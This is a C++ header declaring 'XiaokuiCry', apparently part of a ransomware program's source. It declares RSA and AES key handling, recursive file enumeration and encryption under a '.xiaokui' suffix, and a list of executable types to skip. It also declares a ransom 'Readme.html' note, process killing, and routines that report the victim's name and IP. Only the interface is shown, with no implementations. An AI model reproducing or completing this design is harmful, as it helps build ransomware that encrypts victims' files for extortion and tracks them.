#pragma once
#include <windows.h>  
#include <string>
#include <vector>
#include <openssl/rsa.h>

class XiaokuiCry {
public:
	XiaokuiCry();
	~XiaokuiCry();

	void cry();

private:
	const std::string m_suffix = ".xiaokui";
	const std::wstring m_readme = L"Readme.html";
	RSA* m_rsa_pub_key;
	std::vector<std::wstring> m_root_dir_list;
	std::vector<std::string> m_suffix_ignore = { "386", "bat", "cmd", "dll", "exe", "hlp", "ico", "lnk", "ps1", "pdb", "ocx", "lock"};
	std::vector<std::string> m_processes_need = { "Video.UI.exe" };

	std::vector<std::string> m_ip_list = {};

	std::string wstring_to_string(std::wstring wstr);
	std::string get_file_suffix(std::string filename);

	bool generate_key(unsigned char* key, int key_size);
	void get_rsa_pub_key();
	std::string encrypt_aes_key(unsigned char* key, int key_size);
	void encrypt_file(const std::string& input_file);

	void enumerate_files_and_folders(const std::wstring& path, bool isRecursive);
	bool export_readme_file(std::wstring file_path);
	void open_readme();

	void kill_processes();

	void send_message();
	void get_name_and_ip();
};
